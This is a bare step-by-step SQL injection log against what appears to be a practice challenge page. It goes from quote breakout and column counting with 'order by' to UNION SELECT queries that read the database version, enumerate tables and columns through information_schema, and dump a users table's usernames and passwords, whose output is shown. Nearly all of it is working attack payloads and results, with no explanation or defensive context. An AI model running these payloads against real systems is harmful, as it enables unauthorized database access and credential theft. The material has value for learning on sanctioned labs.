http://leettime.net/sqlninja.com/tasks/basic_ch3.php?id=1"--+

id=1"--+

order by 5--+

--5 columns found

union select 1,2,3,4,5
--second column visible

union select null,version(),null,null,null
--5.6.47-cll-lve

union select null,database(),null,null,null
--leettime_761wHole


union select null,table_name,null,null,null from information_schema.tables where table_schema=database()
--testtable1
--userlogs
--users

union select null,column_name,null,null,null from information_schema.columns where table_schema=database() and table_name='users'
-- id-- username-- password-- user_type-- sec_code

union select null,concat(username,0x09,password,0x0a),null,null,null from users

 injector	khan
 decompiler	hacktract
 devilhunte	dante
 Zen	sec-idiots
 Zenodermus	security-i
 grayhat	hacker
 khan	haxor
 admin	sadmin